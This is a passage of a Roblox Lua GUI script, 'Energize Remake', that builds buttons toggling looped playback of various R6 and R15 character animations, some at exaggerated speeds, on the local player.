	ScrollingFrameR15.Size = UDim2.new(0, 427, 0, 207)
	ScrollingFrameR15.CanvasSize = UDim2.new(0, 0, 0.430000007, 0)
	ScrollingFrameR15.ScrollBarThickness = 10

	FloatSlash.Name = "FloatSlash"
	FloatSlash.Parent = ScrollingFrameR15
	FloatSlash.BackgroundColor3 = Color3.new(0, 0, 0)
	FloatSlash.BackgroundTransparency = 0.30000001192093
	FloatSlash.Position = UDim2.new(0.0563380271, 0, 0.0405257866, 0)
	FloatSlash.Size = UDim2.new(0, 90, 0, 30)
	FloatSlash.Font = Enum.Font.SourceSansSemibold
	FloatSlash.Text = "Float Slash"
	FloatSlash.TextColor3 = Color3.new(1, 1, 1)
	FloatSlash.TextSize = 15

	ArmsOut.Name = "ArmsOut"
	ArmsOut.Parent = ScrollingFrameR15
	ArmsOut.BackgroundColor3 = Color3.new(0, 0, 0)
	ArmsOut.BackgroundTransparency = 0.30000001192093
	ArmsOut.Position = UDim2.new(0.28169015, 0, 0.0405257866, 0)
	ArmsOut.Size = UDim2.new(0, 90, 0, 30)
	ArmsOut.Font = Enum.Font.SourceSansSemibold
	ArmsOut.Text = " Arms Out"
	ArmsOut.TextColor3 = Color3.new(1, 1, 1)
	ArmsOut.TextSize = 15

	DownSlash.Name = "DownSlash"
	DownSlash.Parent = ScrollingFrameR15
	DownSlash.BackgroundColor3 = Color3.new(0, 0, 0)
	DownSlash.BackgroundTransparency = 0.30000001192093
	DownSlash.Position = UDim2.new(0.507042229, 0, 0.0405257866, 0)
	DownSlash.Size = UDim2.new(0, 90, 0, 30)
	DownSlash.Font = Enum.Font.SourceSansSemibold
	DownSlash.Text = "Down Slash"
	DownSlash.TextColor3 = Color3.new(1, 1, 1)
	DownSlash.TextSize = 15

	R15Spinner.Name = "R15Spinner"
	R15Spinner.Parent = ScrollingFrameR15
	R15Spinner.BackgroundColor3 = Color3.new(0, 0, 0)
	R15Spinner.BackgroundTransparency = 0.30000001192093
	R15Spinner.Position = UDim2.new(0.732394338, 0, 0.0405257866, 0)
	R15Spinner.Size = UDim2.new(0, 90, 0, 30)
	R15Spinner.Font = Enum.Font.SourceSansSemibold
	R15Spinner.Text = "Spinner"
	R15Spinner.TextColor3 = Color3.new(1, 1, 1)
	R15Spinner.TextSize = 15

	WeirdZombie.Name = "WeirdZombie"
	WeirdZombie.Parent = ScrollingFrameR15
	WeirdZombie.BackgroundColor3 = Color3.new(0, 0, 0)
	WeirdZombie.BackgroundTransparency = 0.30000001192093
	WeirdZombie.Position = UDim2.new(0.28169015, 0, 0.213602722, 0)
	WeirdZombie.Size = UDim2.new(0, 90, 0, 30)
	WeirdZombie.Font = Enum.Font.SourceSansSemibold
	WeirdZombie.Text = "Weird Zombie"
	WeirdZombie.TextColor3 = Color3.new(1, 1, 1)
	WeirdZombie.TextSize = 15

	CrazySlash.Name = "CrazySlash"
	CrazySlash.Parent = ScrollingFrameR15
	CrazySlash.BackgroundColor3 = Color3.new(0, 0, 0)
	CrazySlash.BackgroundTransparency = 0.30000001192093
	CrazySlash.Position = UDim2.new(0.0563380271, 0, 0.213602722, 0)
	CrazySlash.Size = UDim2.new(0, 90, 0, 30)
	CrazySlash.Font = Enum.Font.SourceSansSemibold
	CrazySlash.Text = "Crazy Slash"
	CrazySlash.TextColor3 = Color3.new(1, 1, 1)
	CrazySlash.TextSize = 15

	Pull.Name = "Pull"
	Pull.Parent = ScrollingFrameR15
	Pull.BackgroundColor3 = Color3.new(0, 0, 0)
	Pull.BackgroundTransparency = 0.30000001192093
	Pull.Position = UDim2.new(0.507042229, 0, 0.213602722, 0)
	Pull.Size = UDim2.new(0, 90, 0, 30)
	Pull.Font = Enum.Font.SourceSansSemibold
	Pull.Text = "Pull"
	Pull.TextColor3 = Color3.new(1, 1, 1)
	Pull.TextSize = 15

	Open.Name = "Open"
	Open.Parent = ScrollingFrameR15
	Open.BackgroundColor3 = Color3.new(0, 0, 0)
	Open.BackgroundTransparency = 0.30000001192093
	Open.Position = UDim2.new(0.732394338, 0, 0.213602722, 0)
	Open.Size = UDim2.new(0, 90, 0, 30)
	Open.Font = Enum.Font.SourceSansSemibold
	Open.Text = "Open"
	Open.TextColor3 = Color3.new(1, 1, 1)
	Open.TextSize = 15

	CircleArm.Name = "CircleArm"
	CircleArm.Parent = ScrollingFrameR15
	CircleArm.BackgroundColor3 = Color3.new(0, 0, 0)
	CircleArm.BackgroundTransparency = 0.30000001192093
	CircleArm.Position = UDim2.new(0.0563380271, 0, 0.386679649, 0)
	CircleArm.Size = UDim2.new(0, 90, 0, 30)
	CircleArm.Font = Enum.Font.SourceSansSemibold
	CircleArm.Text = "Circle Arm"
	CircleArm.TextColor3 = Color3.new(1, 1, 1)
	CircleArm.TextSize = 15

	Bend.Name = "Bend"
	Bend.Parent = ScrollingFrameR15
	Bend.BackgroundColor3 = Color3.new(0, 0, 0)
	Bend.BackgroundTransparency = 0.30000001192093
	Bend.Position = UDim2.new(0.28169015, 0, 0.386679649, 0)
	Bend.Size = UDim2.new(0, 90, 0, 30)
	Bend.Font = Enum.Font.SourceSansSemibold
	Bend.Text = "Bend"
	Bend.TextColor3 = Color3.new(1, 1, 1)
	Bend.TextSize = 15

	RotateSlash.Name = "RotateSlash"
	RotateSlash.Parent = ScrollingFrameR15
	RotateSlash.BackgroundColor3 = Color3.new(0, 0, 0)
	RotateSlash.BackgroundTransparency = 0.30000001192093
	RotateSlash.Position = UDim2.new(0.507042229, 0, 0.386679649, 0)
	RotateSlash.Size = UDim2.new(0, 90, 0, 30)
	RotateSlash.Font = Enum.Font.SourceSansSemibold
	RotateSlash.Text = "Rotate Slash"
	RotateSlash.TextColor3 = Color3.new(1, 1, 1)
	RotateSlash.TextSize = 15

	FlingArms.Name = "FlingArms"
	FlingArms.Parent = ScrollingFrameR15
	FlingArms.BackgroundColor3 = Color3.new(0, 0, 0)
	FlingArms.BackgroundTransparency = 0.30000001192093
	FlingArms.Position = UDim2.new(0.732394338, 0, 0.386679649, 0)
	FlingArms.Size = UDim2.new(0, 90, 0, 30)
	FlingArms.Font = Enum.Font.SourceSansSemibold
	FlingArms.Text = "Fling Arms"
	FlingArms.TextColor3 = Color3.new(1, 1, 1)
	FlingArms.TextSize = 15

	SideFrame.Name = "SideFrame"
	SideFrame.Active = true
	SideFrame.Draggable = true
	SideFrame.Visible = false
	SideFrame.Parent = Energize
	SideFrame.BackgroundColor3 = Color3.new(0.0823529, 0.0823529, 0.0823529)
	SideFrame.BackgroundTransparency = 0.15000000596046
	SideFrame.Position = UDim2.new(0.502199769, 0, 0.55104512, 0)
	SideFrame.Size = UDim2.new(0, 426, 0, 25)

	OpenGUI.Name = "OpenGUI"
	OpenGUI.Parent = SideFrame
	OpenGUI.BackgroundColor3 = Color3.new(0, 0, 0)
	OpenGUI.BackgroundTransparency = 0.15000000596046
	OpenGUI.BorderSizePixel = 0
	OpenGUI.Position = UDim2.new(0.967136145, 0, 0, 0)
	OpenGUI.Size = UDim2.new(0, 15, 0, 15)
	OpenGUI.Font = Enum.Font.SourceSansSemibold
	OpenGUI.Text = "X"
	OpenGUI.TextColor3 = Color3.new(1, 1, 1)
	OpenGUI.TextSize = 14

	SideFrameTitle.Name = "SideFrameTitle"
	SideFrameTitle.Parent = SideFrame
	SideFrameTitle.BackgroundColor3 = Color3.new(1, 1, 1)
	SideFrameTitle.BackgroundTransparency = 1
	SideFrameTitle.Position = UDim2.new(0.364739805, 0, 0, 0)
	SideFrameTitle.Size = UDim2.new(0, 115, 0, 25)
	SideFrameTitle.Font = Enum.Font.SourceSansSemibold
	SideFrameTitle.Text = "Energize Remake"
	SideFrameTitle.TextColor3 = Color3.new(1, 1, 1)
	SideFrameTitle.TextSize = 17
	-- Scripts:
	col = Color3.fromRGB(0, 0, 0)
	loc = Color3.fromRGB(255, 117, 19)
	rcol = Color3.fromRGB(0, 0, 0)
	rloc = Color3.fromRGB(255, 117, 19)

	CloseGUI.MouseButton1Click:connect(function()
		MainFrame.Visible = false
		SideFrame.Visible = true
		SideFrame.Position = MainFrame.Position
	end)

	OpenGUI.MouseButton1Click:connect(function()
		MainFrame.Visible = true
		SideFrame.Visible = false
		MainFrame.Position = SideFrame.Position
	end)

	if (game:GetService"Players".LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R15) then
		ScrollingFrame.Visible = false
		ScrollingFrameR15.Visible = true
		CheckR.Text = "Showing R15 Animations"
	else
		ScrollingFrame.Visible = true
		ScrollingFrameR15.Visible = false
		CheckR.Text = "Showing R6 Animations"
	end

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://35154961"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local HeadThrowACTIVE = false
	HeadThrow.MouseButton1Click:connect(function()
		HeadThrowACTIVE = not HeadThrowACTIVE
		if HeadThrowACTIVE then
			HeadThrow.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if HeadThrowACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			HeadThrow.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://121572214"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local FloatingHeadACTIVE = false
	FloatingHead.MouseButton1Click:connect(function()
		FloatingHeadACTIVE = not FloatingHeadACTIVE
		if FloatingHeadACTIVE then
			track:Play(.1, 1, 1)
			FloatingHead.BackgroundColor3 = loc
		else
			track:Stop()
			FloatingHead.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://182724289"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local CrouchACTIVE = false
	Crouch.MouseButton1Click:connect(function()
		CrouchACTIVE = not CrouchACTIVE
		if CrouchACTIVE then
			track:Play(.1, 1, 1)
			Crouch.BackgroundColor3 = loc
		else
			track:Stop()
			Crouch.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://282574440"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local FloorCrawlACTIVE = false
	FloorCrawl.MouseButton1Click:connect(function()
		FloorCrawlACTIVE = not FloorCrawlACTIVE
		if FloorCrawlACTIVE then
			track:Play(.1, 1, 1)
			FloorCrawl.BackgroundColor3 = loc
		else
			track:Stop()
			FloorCrawl.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://204328711"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local DinoWalkACTIVE = false
	DinoWalk.MouseButton1Click:connect(function()
		DinoWalkACTIVE = not DinoWalkACTIVE
		if DinoWalkACTIVE then
			track:Play(.1, 1, 1)
			DinoWalk.BackgroundColor3 = loc
		else
			track:Stop()
			DinoWalk.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://429681631"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local JumpingJacksACTIVE = false
	JumpingJacks.MouseButton1Click:connect(function()
		JumpingJacksACTIVE = not JumpingJacksACTIVE
		if JumpingJacksACTIVE then
			track:Play(.1, 1, 1)
			JumpingJacks.BackgroundColor3 = loc
		else
			track:Stop()
			JumpingJacks.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://35154961"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local LoopHeadACTIVE = false
	LoopHead.MouseButton1Click:connect(function()
		LoopHeadACTIVE = not LoopHeadACTIVE
		if LoopHeadACTIVE then
			LoopHead.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if LoopHeadACTIVE then
						track:Play(.5, 1, 1e6)
					end
				end
			end
		else
			track:Stop()
			LoopHead.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://184574340"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local HeroJumpACTIVE = false
	HeroJump.MouseButton1Click:connect(function()
		HeroJumpACTIVE = not HeroJumpACTIVE
		if HeroJumpACTIVE then
			HeroJump.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if HeroJumpACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			HeroJump.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://181526230"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local FaintACTIVE = false
	Faint.MouseButton1Click:connect(function()
		FaintACTIVE = not FaintACTIVE
		if FaintACTIVE then
			track:Play(.1, 1, 1)
			Faint.BackgroundColor3 = loc
		else
			track:Stop()
			Faint.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://181525546"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local FloorFaintACTIVE = false
	FloorFaint.MouseButton1Click:connect(function()
		FloorFaintACTIVE = not FloorFaintACTIVE
		if FloorFaintACTIVE then
			FloorFaint.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if FloorFaintACTIVE then
						track:Play(.1, 1, 2)
					end
				end
			end
		else
			track:Stop()
			FloorFaint.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://181525546"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local SuperFaintACTIVE = false
	SuperFaint.MouseButton1Click:connect(function()
		SuperFaintACTIVE = not SuperFaintACTIVE
		if SuperFaintACTIVE then
			SuperFaint.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if SuperFaintACTIVE then
						track:Play(.1, 0.5, 40)
					end
				end
			end
		else
			track:Stop()
			SuperFaint.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://313762630"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local LevitateACTIVE = false
	Levitate.MouseButton1Click:connect(function()
		LevitateACTIVE = not LevitateACTIVE
		if LevitateACTIVE then
			track:Play(.1, 1, 1)
			Levitate.BackgroundColor3 = loc
		else
			track:Stop()
			Levitate.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://183412246"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local DabACTIVE = false
	Dab.MouseButton1Click:connect(function()
		DabACTIVE = not DabACTIVE
		if DabACTIVE then
			Dab.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if DabACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			Dab.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://188632011"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local SpinACTIVE = false
	Spinner.MouseButton1Click:connect(function()
		SpinACTIVE = not SpinACTIVE
		if SpinACTIVE then
			Spinner.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if SpinACTIVE then
						track:Play(.1, 1, 2)
					end
				end
			end
		else
			track:Stop()
			Spinner.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://179224234"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local FloatSitACTIVE = false
	FloatSit.MouseButton1Click:connect(function()
		FloatSitACTIVE = not FloatSitACTIVE
		if FloatSitACTIVE then
			track:Play(.1, 1, 1)
			FloatSit.BackgroundColor3 = loc
		else
			track:Stop()
			FloatSit.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://429703734"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local MovingDanceACTIVE = false
	MovingDance.MouseButton1Click:connect(function()
		MovingDanceACTIVE = not MovingDanceACTIVE
		if MovingDanceACTIVE then
			MovingDance.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if MovingDanceACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			MovingDance.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://215384594"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local WeirdMoveACTIVE = false
	WeirdMove.MouseButton1Click:connect(function()
		WeirdMoveACTIVE = not WeirdMoveACTIVE
		if WeirdMoveACTIVE then
			track:Play(.1, 1, 1)
			WeirdMove.BackgroundColor3 = loc
		else
			track:Stop()
			WeirdMove.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://215384594"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local CloneIllusionACTIVE = false
	CloneIllusion.MouseButton1Click:connect(function()
		CloneIllusionACTIVE = not CloneIllusionACTIVE
		if CloneIllusionACTIVE then
			track:Play(.5, 1, 1e7)
			CloneIllusion.BackgroundColor3 = loc
		else
			track:Stop()
			CloneIllusion.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://313762630"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local GlitchLevitateACTIVE = false
	GlitchLevitate.MouseButton1Click:connect(function()
		GlitchLevitateACTIVE = not GlitchLevitateACTIVE
		if GlitchLevitateACTIVE then
			track:Play(.5, 1, 1e7)
			GlitchLevitate.BackgroundColor3 = loc
		else
			track:Stop()
			GlitchLevitate.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://429730430"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local SpinDanceACTIVE = false
	SpinDance.MouseButton1Click:connect(function()
		SpinDanceACTIVE = not SpinDanceACTIVE
		if SpinDanceACTIVE then
			SpinDance.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if SpinDanceACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			SpinDance.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://45834924"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local MoonDanceACTIVE = false
	MoonDance.MouseButton1Click:connect(function()
		MoonDanceACTIVE = not MoonDanceACTIVE
		if MoonDanceACTIVE then
			MoonDance.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if MoonDanceACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			MoonDance.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://204062532"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local FullPunchACTIVE = false
	FullPunch.MouseButton1Click:connect(function()
		FullPunchACTIVE = not FullPunchACTIVE
		if FullPunchACTIVE then
			FullPunch.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if FullPunchACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			FullPunch.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://186934910"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local SpinDance2ACTIVE = false
	SpinDance2.MouseButton1Click:connect(function()
		SpinDance2ACTIVE = not SpinDance2ACTIVE
		if SpinDance2ACTIVE then
			SpinDance2.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if SpinDance2ACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			SpinDance2.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://204292303"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local BowDownACTIVE = false
	BowDown.MouseButton1Click:connect(function()
		BowDownACTIVE = not BowDownACTIVE
		if BowDownACTIVE then
			BowDown.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if BowDownACTIVE then
						track:Play(.1, 1, 3)
					end
				end
			end
		else
			track:Stop()
			BowDown.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://204295235"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local SwordSlamACTIVE = false
	SwordSlam.MouseButton1Click:connect(function()
		SwordSlamACTIVE = not SwordSlamACTIVE
		if SwordSlamACTIVE then
			SwordSlam.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if SwordSlamACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			SwordSlam.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://204295235"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local LoopSlamACTIVE = false
	LoopSlam.MouseButton1Click:connect(function()
		LoopSlamACTIVE = not LoopSlamACTIVE
		if LoopSlamACTIVE then
			LoopSlam.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if LoopSlamACTIVE then
						track:Play(.1, 1, 1e4)
					end
				end
			end
		else
			track:Stop()
			LoopSlam.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://184574340"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local MegaInsaneACTIVE = false
	MegaInsane.MouseButton1Click:connect(function()
		MegaInsaneACTIVE = not MegaInsaneACTIVE
		if MegaInsaneACTIVE then
			MegaInsane.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if MegaInsaneACTIVE then
						track:Play(.1, 0.5, 40)
					end
				end
			end
		else
			track:Stop()
			MegaInsane.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://126753849"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local SuperPunchACTIVE = false
	SuperPunch.MouseButton1Click:connect(function()
		SuperPunchACTIVE = not SuperPunchACTIVE
		if SuperPunchACTIVE then
			SuperPunch.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if SuperPunchACTIVE then
						track:Play(.1, 1, 3)
					end
				end
			end
		else
			track:Stop()
			SuperPunch.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://218504594"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local FullSwingACTIVE = false
	FullSwing.MouseButton1Click:connect(function()
		FullSwingACTIVE = not FullSwingACTIVE
		if FullSwingACTIVE then
			FullSwing.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if FullSwingACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			FullSwing.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://259438880"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local ArmTurbineACTIVE = false
	ArmTurbine.MouseButton1Click:connect(function()
		ArmTurbineACTIVE = not ArmTurbineACTIVE
		if ArmTurbineACTIVE then
			track:Play(.1, 1, 1e3)
			ArmTurbine.BackgroundColor3 = loc
		else
			track:Stop()
			ArmTurbine.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://136801964"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local BarrelRollACTIVE = false
	BarrelRoll.MouseButton1Click:connect(function()
		BarrelRollACTIVE = not BarrelRollACTIVE
		if BarrelRollACTIVE then
			BarrelRoll.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if BarrelRollACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			BarrelRoll.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://180612465"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local ScaredACTIVE = false
	Scared.MouseButton1Click:connect(function()
		ScaredACTIVE = not ScaredACTIVE
		if ScaredACTIVE then
			Scared.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if ScaredACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			Scared.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://33796059"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local InsaneACTIVE = false
	Insane.MouseButton1Click:connect(function()
		InsaneACTIVE = not InsaneACTIVE
		if InsaneACTIVE then
			track:Play(.1, 1, 1e8)
			Insane.BackgroundColor3 = loc
		else
			track:Stop()
			Insane.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://33169583"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local ArmDetachACTIVE = false
	ArmDetach.MouseButton1Click:connect(function()
		ArmDetachACTIVE = not ArmDetachACTIVE
		if ArmDetachACTIVE then
			ArmDetach.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if ArmDetachACTIVE then
						track:Play(.1, 1, 1e6)
					end
				end
			end
		else
			track:Stop()
			ArmDetach.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://35978879"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local SwordSliceACTIVE = false
	SwordSlice.MouseButton1Click:connect(function()
		SwordSliceACTIVE = not SwordSliceACTIVE
		if SwordSliceACTIVE then
			track:Play(.1, 1, 1)
			SwordSlice.BackgroundColor3 = loc
		else
			track:Stop()
			SwordSlice.BackgroundColor3 = col
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://27432691"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local InsaneArmsACTIVE = false
	InsaneArms.MouseButton1Click:connect(function()
		InsaneArmsACTIVE = not InsaneArmsACTIVE
		if InsaneArmsACTIVE then
			InsaneArms.BackgroundColor3 = loc
			while wait() do
				if track.IsPlaying == false then
					if InsaneArmsACTIVE then
						track:Play(.1, 1, 1e4)
					end
				end
			end
		else
			track:Stop()
			InsaneArms.BackgroundColor3 = col
		end
	end)
	-- R15
	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://674871189"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local CrazySlashACTIVE = false
	CrazySlash.MouseButton1Click:connect(function()
		CrazySlashACTIVE = not CrazySlashACTIVE
		if CrazySlashACTIVE then
			CrazySlash.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if CrazySlashACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			CrazySlash.BackgroundColor3 = rcol
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://582855105"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local OpenACTIVE = false
	Open.MouseButton1Click:connect(function()
		OpenACTIVE = not OpenACTIVE
		if OpenACTIVE then
			Open.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if OpenACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			Open.BackgroundColor3 = rcol
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://754658275"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local R15SpinnerACTIVE = false
	R15Spinner.MouseButton1Click:connect(function()
		R15SpinnerACTIVE = not R15SpinnerACTIVE
		if R15SpinnerACTIVE then
			R15Spinner.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if R15SpinnerACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			R15Spinner.BackgroundColor3 = rcol
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://582384156"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local ArmsOutACTIVE = false
	ArmsOut.MouseButton1Click:connect(function()
		ArmsOutACTIVE = not ArmsOutACTIVE
		if ArmsOutACTIVE then
			ArmsOut.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if ArmsOutACTIVE then
						track:Play(.1, 1, 1)
					end
				end
			end
		else
			track:Stop()
			ArmsOut.BackgroundColor3 = rcol
		end
	end)

	local Anim = Instance.new("Animation")
	Anim.AnimationId = "rbxassetid://717879555"
	local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
	local FloatSlashACTIVE = false
	FloatSlash.MouseButton1Click:connect(function()
		FloatSlashACTIVE = not FloatSlashACTIVE
		if FloatSlashACTIVE then
			FloatSlash.BackgroundColor3 = rloc
			while wait() do
				if track.IsPlaying == false then
					if FloatSlashACTIVE then
